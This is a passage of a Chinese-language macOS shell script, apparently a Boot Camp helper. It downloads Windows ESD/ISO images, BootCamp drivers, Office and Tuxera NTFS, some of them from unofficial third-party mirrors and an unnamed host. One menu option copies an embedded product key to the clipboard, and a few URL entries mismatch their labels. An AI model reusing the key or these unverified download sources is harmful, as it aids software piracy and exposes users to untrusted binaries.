	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/fc218496-6e48-47e9-9df1-d5719b3a59fa/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "1511" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then	
	index="4"
	SourceSHA1="90f718ea6c6d3fbbeecdbffb3a4b18190a13a02b"
    url="http://b1.download.windowsupdate.com/d/upgr/2016/03/10586.0.160212-2000.th2_refresh_clientprofessionalvl_vol_x64fre_zh-cn_90f718ea6c6d3fbbeecdbffb3a4b18190a13a02b.esd"
	fi
	name=${url##*/}
	fi	
	if [ "$url" ]; then
	if [ "$isoesd" ]; then
	isoName="$xtbb"
	xtname="$name"
	AZPKG
	fi
	fi
	if [ "$url" ]; then
	drvname=${url##*/}
	MSDN2
	fi
	MSDN
	;;
	2)
	if [[ "$xtbb" = "22H2" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="4"
	SourceSHA1="485efaca7f0c0e017e4bb0c565ec48dfd0f78695"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5fdb4d51-62f0-41bb-9487-d80b18bc11f7/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then
	index="6"
	SourceSHA1="2609e677bbe6bec2c516b73ecb19727a711c43b3"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/c5e26e09-9a46-4543-ab9c-d0bce2894171/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"
	fi
	if [[ "$xtyy" = "en-us" ]]; then
	index="9"
	SourceSHA1="cb5d06fb5e5f21b8615d202ce6fc5f11bde79624"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/ccc3c3f4-dcca-44b3-8381-1d6c1c58fd4f/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us.esd"
	fi
	if [[ "$xtyy" = "ja-jp" ]]; then
	index="6"
	SourceSHA1="71b1aa5517722a0c5e40eab533f6057dc434a2b8"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/5a3d3076-277c-40af-802a-804482e396be/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp.esd"
	fi
	if [[ "$xtyy" = "ko-kr" ]]; then
	index="6"
	SourceSHA1="52f99fdb2edbac3c112918e6ee0a97df5336fdd6"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/00eaf4bc-62bd-47e8-bcb6-4ca2c607c6da/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "21H2" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="4"
	SourceSHA1="b3bf39da71b54027ec3d6698803b8429393de608"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn_b3bf39da71b54027ec3d6698803b8429393de608.esd"
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then
	index="4"
	SourceSHA1="ce3228aeef53026e855b7e801af053cf671d8028"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw_ce3228aeef53026e855b7e801af053cf671d8028.esd"
	fi
	if [[ "$xtyy" = "en-us" ]]; then
	index="4"
	SourceSHA1="e2492e60dcdbffc18f828167e96699335aa8396c"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us_e2492e60dcdbffc18f828167e96699335aa8396c.esd"
	fi
	if [[ "$xtyy" = "ja-jp" ]]; then
	index="4"
	SourceSHA1="e0f708eab8eaa9f4c7a98c81a15b0ffcfa1aaba2"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp_e0f708eab8eaa9f4c7a98c81a15b0ffcfa1aaba2.esd"
	fi
	if [[ "$xtyy" = "ko-kr" ]]; then
	index="4"
	SourceSHA1="c4816c63965428fde8d02758b054d36c0c3c7cfa"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/09/19044.1165.210806-1742.21h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr_c4816c63965428fde8d02758b054d36c0c3c7cfa.esd"
	fi	
	name=${url##*/}
	fi
	if [[ "$xtbb" = "Wi11" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="4"
	SourceSHA1="c2688015d7416d37884cbc44651b93b00d874850"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn_c2688015d7416d37884cbc44651b93b00d874850.esd"
	if [ "$w1122" ]; then
	SourceSHA1="bd4a27bf5019eb3bc27a48d10b5564665e0945fd"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/9282e556-e4ce-4e75-a650-3b8dea2f060a/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"	
	fi
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then
	index="4"
	SourceSHA1="9453708f66b61f35c3810e7921a4684ad00e4e85"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw_9453708f66b61f35c3810e7921a4684ad00e4e85.esd"
	if [ "$w1122" ]; then
	SourceSHA1="a58d8625f84e64585812ff96e6a73ef89f7d8c59"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/0b4200a9-1404-4839-8ddb-410011c8a682/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"	
	fi
	fi
	if [[ "$xtyy" = "en-us" ]]; then
	index="4"
	SourceSHA1="966cbea0f8a06f27f64658a5db8a9f0dd43c77ed"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us_966cbea0f8a06f27f64658a5db8a9f0dd43c77ed.esd"
	if [ "$w1122" ]; then
	SourceSHA1="2057bb288e6e99f9ed799b4e32bc76113471770f"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/b55d248a-3c1e-49aa-9115-1628824af2dc/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_en-us.esd"	
	fi
	fi
	if [[ "$xtyy" = "ja-jp" ]]; then
	index="4"
	SourceSHA1="f1b0b7c82ece337fa3836c339eff203d603a1144"
	url="http://b1.download.windowsupdate.com/d/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp_f1b0b7c82ece337fa3836c339eff203d603a1144.esd"
	if [ "$w1122" ]; then
	SourceSHA1="c1b6557597e9f26d0af3aa3d16b2e6aa12ae9bab"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/f113b28c-22fd-42f3-8d68-671f6fc0b628/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ja-jp.esd"	
	fi
	fi
	if [[ "$xtyy" = "ko-kr" ]]; then
	index="4"
	SourceSHA1="0a9443823e621fb77ab827def4054d0e5ec53d01"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr_0a9443823e621fb77ab827def4054d0e5ec53d01.esd"
	if [ "$w1122" ]; then
	SourceSHA1="46052359537a9feea079c259fe66bb5f7ba9263f"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/7e6a8fda-92eb-4ae9-8a9a-264d622372bf/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_ko-kr.esd"	
	fi
	fi	
	name=${url##*/}
	fi
	if [[ "$xtbb" = "1709" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then	
	index="5"
	SourceSHA1="cc52c191fda2caff9d5b6730ee88a11758dc0138"
	url="http://fg.ds.b1.download.windowsupdate.com/c/Upgr/2017/10/16299.15.170928-1534.rs3_release_clientconsumer_ret_x64fre_zh-cn_cc52c191fda2caff9d5b6730ee88a11758dc0138.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "1809" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then	
	index="4"
	SourceSHA1="1a644e45bd9b1b88b45a7d345d5b63ca589813e4"
	url="http://fg.ds.b1.download.windowsupdate.com/d/Upgr/2018/09/17763.1.180914-1434.rs5_release_clientconsumer_ret_x64fre_zh-cn_1a644e45bd9b1b88b45a7d345d5b63ca589813e4.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "1909" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then	
	index="4"
	SourceSHA1="339b54a7c6f73e30b8d235c5b97c2e5e31f7d392"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/3f88ad25-f1b2-49fa-b580-fb8d1ac54ecb/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
	fi
	if [[ "$xtyy" = "zh-tw" ]]; then	
	index="4"
	SourceSHA1="6ea61e025ff52d9fc612a0d40bd2764204141ce7"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/14673831-a565-46f4-be56-484c9b598b0e/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"
	fi
	if [[ "$xtyy" = "en-us" ]]; then	
	index="4"
	SourceSHA1="200ca757148b240519937662985f5e098e2ef207"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/fc218496-6e48-47e9-9df1-d5719b3a59fa/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-tw.esd"
	fi	
	name=${url##*/}
	fi	
	if [ "$url" ]; then
	if [ "$isoesd" ]; then
	isoName="$xtbb"
	xtname="$name"
	AZPKG
	fi
	fi
	if [ "$url" ]; then
	drvname=${url##*/}
	MSDN2
	fi
	MSDN
	;;
	3)
	if [[ "$xtbb" = "22H2" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="5"
	SourceSHA1="55ee62e21786e6c4daff875f2fce65db67241f83"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/a6fca105-b105-4b13-b98b-74848e48e3e8/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "Wi11" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="5"
	SourceSHA1="923f912bdfd9374d9890fea8e0fa76a57d3db524"
	url="http://b1.download.windowsupdate.com/c/upgr/2021/08/22000.132.210809-2349.co_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn_923f912bdfd9374d9890fea8e0fa76a57d3db524.esd"
	if [ "$w1122" ]; then
	SourceSHA1="8a8bd8df94f11b350abb0639662e8956fc3ac885"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/c1dd582c-68cb-4c22-8926-637352b88992/22621.525.220925-0207.ni_release_svc_refresh_CLIENTBUSINESS_VOL_x64FRE_zh-cn.esd"	
	fi
	fi
	name=${url##*/}
	fi
	if [ "$url" ]; then
	if [ "$isoesd" ]; then
	isoName="$xtbb"
	xtname="$name"
	AZPKG
	fi
	fi
	if [ "$url" ]; then
	drvname=${url##*/}
	MSDN2
	fi
	MSDN
	;;
	4)
	if [[ "$xtbb" = "22H2" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="4"
	SourceSHA1="afe05b25238dc05fe2562fd85bdc9fdc601a4f2c"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/1d9e5688-3afb-4133-b711-2c9a0c4b22b5/19045.2006.220908-0225.22h2_release_svc_refresh_CLIENTCHINA_RET_x64FRE_zh-cn.esd"
	fi
	name=${url##*/}
	fi
	if [[ "$xtbb" = "Wi11" ]]; then
	if [[ "$xtyy" = "zh-cn" ]]; then
	index="4"
	SourceSHA1="4128af42f8bfedff6596267d755e12ef9a092403"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/ad6e5e87-14da-4577-a9da-dd345685efe8/22000.318.211104-1236.co_release_svc_refresh_CLIENTCHINA_RET_x64FRE_zh-cn.esd"
	if [ "$w1122" ]; then
	SourceSHA1="a79ac57d7a20100e8e69df749ebb8ebd0abb75b9"
	url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/bb82f18d-5184-420c-bd2e-0ba3e8ac2528/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCHINA_RET_x64FRE_zh-cn.esd"
	fi
	fi
	name=${url##*/}
	fi
	if [ "$url" ]; then
	if [ "$isoesd" ]; then
	isoName="$xtbb"
	xtname="$name"
	AZPKG
	fi
	fi
	if [ "$url" ]; then
	drvname=${url##*/}
	MSDN2
	fi
	MSDN
	;;
	7)
	msdn7="1"
	name2="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	drvname="cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	url2="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso"
	SourceSHA1="2ce0b2db34d76ed3f697ce148cb7594432405e23"
	if [ ! "$isoesd" ]; then
	MSDN2
	else
	isoesd=""
	xtname="$name"
	Download
	fi
	;;
	s)
	msdn732="1"
	name2="cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	drvname="cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	url2="http://ybcn.ruanjiandown.com:6875/cn/cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso"
	if [ ! "$isoesd" ]; then
	MSDN2
	else
	isoesd=""
	xtname="$name"
	Download
	fi
	;;
	8)
	msdn8="1"
	name="cn_windows_8.1_with_update_x64_dvd_6051473.iso"
	url="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_8.1_with_update_x64_dvd_6051473.iso"
	SourceSHA1="9a85eac2d20446e3e086bf57a7dfc8832fb3ba56"
	drvname="cn_windows_8.1_with_update_x64_dvd_6051473.iso"
	if [ ! "$isoesd" ]; then
	MSDN2
	else
	isoesd=""
	xtname="$name"
	Download
	fi
	;;
	l)
	msdn8="1"
	reltsc="1"
	name="cn_windows_10_enterprise_ltsc_2019_x64_dvd_d17070a8.iso"
	url="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_10_enterprise_ltsc_2019_x64_dvd_d17070a8.iso"
	SourceSHA1="c0b4704e1336281c98a91438c7df0f14b8f41e46"
	drvname="cn_windows_10_enterprise_ltsc_2019_x64_dvd_d17070a8.iso"
	if [ ! "$isoesd" ]; then
	MSDN2
	else
	isoesd=""
	xtname="$name"
	Download
	fi
	;;
	c)
	msdn8="1"
	reltsc="1"
	name="cn_windows_10_enterprise_2016_ltsb_x64_dvd_9060409.iso"
	url="http://ybcn-ruanjiandown-com.supergslb.com/cn/cn_windows_10_enterprise_2016_ltsb_x64_dvd_9060409.iso"
	SourceSHA1="9e405e950890d2a196565bca35e152f9cfad296d"
	drvname="cn_windows_10_enterprise_2016_ltsb_x64_dvd_9060409.iso"
	if [ ! "$isoesd" ]; then
	MSDN2
	else
	isoesd=""
	xtname="$name"
	Download
	fi
	;;
	b)
	ISOBootCamp
	;;
	x)
	XTLB
	;;	
esac
    MSDN
}


MSDN2(){


	if [ "$msdn732" ]; then
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	if [ "$No732" ]; then
	echo
    read -s -n1 -p "此机型不支持安装32位Win7"
    Customize	
	fi
	if [ "$sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
    read -s -n1 -p "SIP未关闭，无法安装！！！"
    Customize
	fi
	PEDrv="1"
	repe="1"
	re700="1"
	Win786="1"
	index="5"
	if [ "$btap" ]; then
	if [ "$btap" = "4.1.4586" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/50/29/041-84869-A_EJ35WAWA75/obofx71e3kcf8aqzukdrzg7hqpv1p06hca/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4326" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/50/29/041-84869-A_EJ35WAWA75/obofx71e3kcf8aqzukdrzg7hqpv1p06hca/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4255" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/36/49/041-98163/n3zau0xy5j0a121vnvud3jac2ahplizknu/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4131" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/29/62/041-84859-A_GGUOSJMIGN/sb1apxcjpp358ze2df6bzhwd49m2cqyzy5/BootCampESD.pkg"
	fi
	else
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/57/55/041-84868-A_402D0DFI39/6uz8hhgtd4b87t00mrq0uihiop5ivumsbk/BootCampESD.pkg"	
    fi
	FenQu2
    fi

	if [ "$msdn7" ]; then
	if [ "$pcissd" ]; then
	echo
	echo
	echo
	echo "注意：检测到PCI转接硬盘！"
	echo
	echo
	read -s -n1 -p "PCI转接硬盘，无法安装Win7！！！"
    Customize
	fi
	if [ "$NoWin7" ]; then
	echo
    read -s -n1 -p "此机型不支持安装Win7！"
    Customize	
	fi
	PEDrv="1"
	repe="1"
	MBR10="1"
	re700="1"
	index="4"
	OsWin764="1"
	if [ "$sip" ]; then
	MBR10=""	
	fi
	if [ "$btap" ]; then
	if [ "$btap" = "5.1.5640" ]; then
 	name="BootCamp.zip"
	url="http://xzd.197946.com/bootcamp.zip"
	fi
	if [ "$btap" = "5.1.5769" ]; then
 	name="BootCamp.zip"
	url="https://download.info.apple.com/Mac_OS_X/031-30890-20150812-ea191174-4130-11e5-a125-930911ba098f/bootcamp5.1.5769.zip"
	fi
	if [ "$btap" = "5.1.5722" ]; then
 	name="BootCamp.zip"
	url="https://download.info.apple.com/Mac_OS_X/031-30883-20150812-ea1d13dc-4130-11e5-ba25-920911ba098f/bootcamp5.1.5722.zip"
	fi
	if [ "$btap" = "5.1.5621" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.1.4586" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/35/46/041-87995-A_EWCD1K4CH1/2b5jaj1p2oxqlpzgwat4bdqjpjs8n3mxip/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4326" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/50/29/041-84869-A_EJ35WAWA75/obofx71e3kcf8aqzukdrzg7hqpv1p06hca/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4255" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/36/49/041-98163/n3zau0xy5j0a121vnvud3jac2ahplizknu/BootCampESD.pkg"
	fi
	if [ "$btap" = "4.0.4131" ]; then
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/29/62/041-84859-A_GGUOSJMIGN/sb1apxcjpp358ze2df6bzhwd49m2cqyzy5/BootCampESD.pkg"
	fi
	else
 	name="BootCampESD.pkg"
	url="http://swcdn.apple.com/content/downloads/57/55/041-84868-A_402D0DFI39/6uz8hhgtd4b87t00mrq0uihiop5ivumsbk/BootCampESD.pkg"	
    fi
	FenQu2
    fi

    if [ "$msdn8" ]; then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$EFI8" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$EFI8" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
	PEDrv="1"
	repe="1"
	if [ ! "$reltsc" ]; then
	re800="1"
	else
	re800=""
	fi
	index="1"
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	fi
	FenQu2
fi


if [ "$sip" ]; then
if [ "$MBR10" ]; then
sip="1"
sipp="1"
MBR10=""
fi
fi

if [[ "$xtbb" = "1709" ]]; then
pnputil="pnputil1709.exe"
fi
if [[ "$xtbb" = "1511" ]]; then
reg="1511"
fi

if [ ! "$sipp" ]; then
if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
	echo "检查Recovery分区"	
	echo
	diskutil list
	echo
	echo
	read -s -n1 -p "此机型SIP未关闭，无法安装！！！"
    Customize
    fi
	fi
fi	
    if [ ! "$MBR10" ]; then
    if [[ $modelxh = "10.10"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.11"* ]]; then
    if [ "$NoWin7" ]; then
    sip="1"
    fi
    fi
    if [[ $modelxh = "10.12"* ]]; then
    sip="1"
    fi
    fi
    if [ ! "$DrvWin10" ]; then
	PEDrv="1"
	repe="1"
	fi
	if [ ! -f ~/Downloads/BootCamp/WindowsSupport.dmg ]; then
	if [ "$MBR10" ]; then
	name2="BootCampESD.pkg"
	url2="http://swcdn.apple.com/content/downloads/62/58/041-98143-A_HN8B941A1T/nknv1gt3xcgylggwc11kl5e0j4296tjfo1/BootCampESD.pkg"
	if [ "$zgmac" = "10.13" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	if [ "$zgmac" = "10.11" ]; then
	url2="http://swcdn.apple.com/content/downloads/26/08/041-84821-A_AMCFPC3QDK/4fffs8qgdflw7pn1finqqd40gifh41mvs6/BootCampESD.pkg"
	fi
	fi
	FenQu2
}


ISOBootCamp(){
clear && printf "\e[3J"
if [ ! "$iosbb" ]; then
iosbb="1903"
fi
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo
echo "    ________________________ Windows-System ________________________"
echo "   |                      ---------------------                     |"
echo "   |                                                                |"
echo "   |   \033[46m[7]\033[0m $iosbb-Windows10 \033[46m[Q]\033[0m                                       |"
echo "   |                                                                |"
echo "   |   \033[46m[1]\033[0m Windows10-22H2Pro（自动驱动ESD）                         |"
echo "   |                                                                |"
echo "   |   \033[46m[2]\033[0m Windows11-22H2Pro（自动驱动ESD）                         |"
echo "   |                                                                |"
echo "   |   \033[41;37m[x]\033[0m 返回                                                     |"
echo "   |                                                                |"
echo "   |________________________________________________________________|"
echo
echo
read -p "_______请输入:" num
echo
case "$num" in
    q)
	if [[ "$iosbb" = "1709" ]]; then
	iosbb="1803"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "1803" ]]; then
	iosbb="1809"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "1809" ]]; then
	iosbb="1903"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "1903" ]]; then
	iosbb="1909"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "1909" ]]; then
	iosbb="2004"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "2004" ]]; then
	iosbb="20H2"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "20H2" ]]; then
	iosbb="21H1"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "21H1" ]]; then
	iosbb="22H2"
	ISOBootCamp
	fi
	if [[ "$iosbb" = "22H2" ]]; then
	iosbb="1709"
	ISOBootCamp
	fi
	;;
    7)
    if [[ "$iosbb" = "1709" ]]; then
	name="Win10_1709_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42759/Win10_1709_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "1803" ]]; then
	name="Win10_1803_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42760/Win10_1803_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "1809" ]]; then
	name="Win10_1809_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42761/Win10_1809_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "1903" ]]; then
	name="Win10_1903_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42762/Win10_1903_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "1909" ]]; then
	name="Win10_1909_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42771/Win10_1909_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "2004" ]]; then
	name="Win10_2004_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42767/Win10_2004_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "20H2" ]]; then
	name="Win10_20H2_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42775/Win10_20H2_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "21H1" ]]; then
	name="Win10_21H1_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/42776/Win10_21H1_Chinese(Simplified)_x64.iso"
	fi
	if [[ "$iosbb" = "22H2" ]]; then
	name="Win10_22H2_Chinese(Simplified)_x64.iso"
	url="http://directurl.cn/file/58701/Win10_21H1_Chinese(Simplified)_x64.iso"
	fi	
	Download
	;;
    1)
	name="Windows10.dmg"
	url=""$ipd"10iso"
	SourceMD5="5e144e413547f0858a4d8dd64153a5f7"
	xgiso="1"
	isoName="Win10"
	AZPKG
	;;
    2)
	name="Windows11.dmg"
	url=""$ipd"11iso"
	SourceMD5="1b7fb6d98668fea978a92bd653290808"
	xgiso="1"
	isoName="Win11"
	AZPKG
	;;
    x)
	MSDN
	;;	
esac
    ISOBootCamp
}


Macsoft(){
clear && printf "\e[3J"
echo
echo "    ______________________      常用软件      ______________________"
echo "   |                      --------------------                      |"
echo "   |                                                                |"
echo "   |   \033[35m[1]\033[0m office                                                   |"
echo "   |                                                                |"
echo "   |   \033[35m[2]\033[0m TuxeraNTFS                       \033[35m[F]\033[0m 复制JHM             |"
echo "   |                                                                |"
echo "   |   \033[41;37m[x]\033[0m 返回                                                     |"
echo "   |                                                                |"
echo "   |________________________________________________________________|"
echo
echo
echo
read -p "_______请输入:" num
echo
case "$num" in
	1)
	azof="1"
	if [[ $modelxh = "10.10"* ]]; then
	name="2016.pkg"
	url="$ipd/2016.pkg"
    AZPKG
	fi
	if [[ $modelxh = "10.11"* ]]; then
	name="2016.pkg"
	url="$ipd/2016.pkg"
    AZPKG
	fi
	if [[ $modelxh = "10.12"* ]]; then
	name="2016.pkg"
	url="$ipd/2016.pkg"
    AZPKG
	fi
	name="2021.pkg"
	url="$ipd/2021.pkg"
    AZPKG
	;;
	2)
	azof="1"
	name="NTFS.dmg"
	url="$ipd/NTFS.dmg"
    AZPKG
	;;
	f)
	echo "3VV2VF-HQZ01U-MZ5ZU9-ZVEH45-H6CFE4" | tr -d '\n' | pbcopy
	Macsoft
	;;
	x)
	clear && printf "\e[3J"
	XTLB
	;;
	*)
	clear && printf "\e[3J"
	echo -e "\033[31m"
	read -s -n1 -p "输入错误！请输入正确的选项！请按任意键返回重新输入... "
	echo -e "\033[0m"
	Macsoft
	;;
esac
}


SJZGMAC(){
url=""
name=""
xtszbb="$(echo "${modelxh}"|awk -F '.' '{print $1$2$3}')"
kykj="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/[^0-9]//g')"
osascript <<EOD
tell application "Terminal"
activate
set size of window 1 to {800, 740}
end tell
EOD
if [ ! "$fqmac" ]; then
fqmacc="关"
azmac=""
else
if [ "$kykj" -lt "33" ]; then
echo
read -s -n1 -p "注意：剩余空间小于33G！"
fi
fqmacc="开"
azmac="1"
fi
if [ "$pcissd" ]; then
echo
read -s -n1 -p "注意：检测到PCI转接硬盘！"
fi
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
if [ ! "$upazmac" ]; then
if [[ $modelxh = "10.6"* ]]; then
dqzgmac="当前系统最高直接升级：10.11"
fi
if [[ $modelxh = "10.7"* ]]; then
dqzgmac="当前系统最高直接升级：10.12"
fi
if [[ $modelxh = "10.8"* ]]; then
dqzgmac="当前系统最高直接升级：10.14"
fi
